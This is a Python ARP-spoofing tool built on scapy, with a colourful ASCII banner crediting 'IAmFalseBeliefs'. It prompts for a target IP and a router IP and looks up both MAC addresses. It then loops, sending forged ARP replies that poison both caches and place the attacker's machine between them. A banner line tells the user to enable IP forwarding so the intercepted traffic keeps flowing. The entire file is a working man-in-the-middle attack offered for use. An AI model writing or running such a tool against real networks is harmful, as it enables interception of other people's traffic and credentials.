from scapy.all import *
import sys
import time
from termcolor import colored
c = colored

print(c("                                                             __  ", "red"))
print(c("                               /\                           / _| ", "yellow"))
print(c("                              /  \   _ __ _ __   ___   ___ | |_  ", "green"))
print(c("                             / /\ \ | '__| '_ \ / _ \ / _ \   _| ", "cyan"))
print(c("                            / ____ \  |  | |_) | (_) | (_) | |   ", "magenta"))
print(c("                           /_/    \_\_|  | .__/ \___/ \___/|_|   ", "red"))
print(c("                                         | |                     ", "yellow"))
print(c("                                         |_|                     ", "green"))
print("               <<<<<----->= Arp Spoofer By: IAmFalseBeliefs <=----->>>>> ")
print("                   <<<<<----->= IP Addresses made easy <=----->>>>> ")
print(" <<<<<----->= exit this and type, \"echo 1 >> /proc/sys/net/ipv4/ip_forward\" <=----->>>>>")
print("\n")

def get_mac_address(ip_address):
	broadcats_layer = scapy.layers.l2.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_layer = scapy.layers.l2.ARP(pdst = ip_address)
	get_mac_packet = broadcats_layer/arp_layer
	answer = scapy.sendrecv.srp(get_mac_packet, timeout = 2, verbose = False)[0]
	return answer[0][1].hwsrc

def spoof(router_ip, target_ip, router_mac, target_mac):
	routerpac = scapy.layers.l2.ARP(op = 2, hwdst = router_mac, pdst = router_ip, psrc = target_ip)
	targpac = scapy.layers.l2.ARP(op = 2, hwdst = target_mac, pdst = target_ip, psrc = router_ip)
	scapy.sendrecv.send(routerpac)
	scapy.sendrecv.send(targpac)

target_ip = input("[----] Enter target's IP address to spoof to: ")
router_ip = input("[----] Enter router's IP address to send ARP packets to: ")
print("\n")

target_mac = str(get_mac_address(target_ip))
router_mac = str(get_mac_address(router_ip))

try:
	while True:
		spoof(router_ip, target_ip, router_mac, target_mac)
		time.sleep(2)

except KeyboardInterrupt:
	print(c("[----] Closing ARP Spoofer"))
	exit(0)



